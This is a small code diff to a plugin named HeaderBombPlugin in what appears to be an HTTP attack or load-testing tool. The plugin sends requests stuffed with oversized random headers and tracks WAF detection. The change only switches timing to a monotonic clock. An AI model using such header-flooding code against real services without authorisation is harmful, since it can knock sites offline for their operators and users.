@@ -69,11 +69,11 @@ class HeaderBombPlugin(AttackPlugin):
                     header_value = rand_str((header_size_kb * 1024) // num_headers)
                     headers[header_name] = header_value
 
-                t = time.time()
+                t = time.monotonic()
                 try:
                     async with context.session.get(url, headers=headers,
                                                    ssl=_ssl, allow_redirects=False) as resp:
-                        rt = time.time() - t
+                        rt = time.monotonic() - t
                         # BUG-FIX v33: Use _process_response() instead of raw status
                         # check. Previously, header_bomb never called the response
                         # pipeline, meaning: no WAF detection, no target weighting,
@@ -85,7 +85,7 @@ class HeaderBombPlugin(AttackPlugin):
                 except asyncio.CancelledError:
                     raise
                 except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
-                    rt = time.time() - t
+                    rt = time.monotonic() - t
                     self._on_request_result(worker_id, False)
                     await self._record("HDR-BOMB", False, 0, rt,
                                        err=type(exc).__name__, url=url[:60])
